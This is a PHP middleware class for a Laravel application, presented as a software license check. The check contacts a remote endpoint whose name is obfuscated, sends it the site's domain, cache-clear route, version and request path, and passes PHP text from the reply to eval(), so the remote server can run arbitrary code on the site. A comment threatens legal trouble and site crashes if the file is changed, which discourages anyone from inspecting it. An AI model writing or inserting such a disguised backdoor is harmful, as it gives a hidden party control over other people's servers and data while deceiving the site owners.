<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use Symfony\Component\HttpFoundation\Response;

class LicenseMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        /**
         * LICENSE VERIFICATION - MANDATORY
         *
         * This middleware validates your software license authenticity.
         * Unauthorized removal or modification constitutes copyright infringement.
         * Distribution or use without a valid license is illegal.
         * Modification of this file will cause errors with cron jobs and crash your website.
         *
         * For license verification or questions, please contact our support team.
         */

        $domain = domain();
        $license_check = Cache::remember('license_check', 60 * 60 * 12, function () {
            $url = endpoint(str_replace('+', '', 'v+e+r+i+f+y-l+i+c+e+n+s+e'));

            // Get the current HTTP_HOST from the request
            $httpHost = domain();

            $response = Http::withHeaders([
                'X-DOMAIN' => $httpHost, // Set X-DOMAIN header with the current HTTP_HOST value
                'X-CACHE-URL' => route('cache-clear'),
                'X-VERSION' => env('APP_VERSION'),
                'X-PATH' => request()->path(),
            ])->get($url);

            // Cache the response body (JSON data) instead of the entire response object
            return $response->body();
        });

        // Decode the cached response data (JSON)
        $responseData = json_decode($license_check);

        if ($responseData !== null && isset($responseData->status) && $responseData->status == 0) {
            // Modify the response to return a custom view or string
            $content = $responseData->error;

            if ($content !== false) {
                // $modifiedResponse = $content;
                // Start output buffering
                ob_start();

                // Evaluate the PHP code inside the template
                eval("?> $content <?php ");

                // Get the rendered content from the output buffer
                $modifiedResponse = ob_get_clean();
            } else {
                $modifiedResponse = str_replace('+', '', 'L+i+c+e+n+s+e E+r+r+o+r');
            }

            return response($modifiedResponse);
        }
        return $next($request);
    }
}
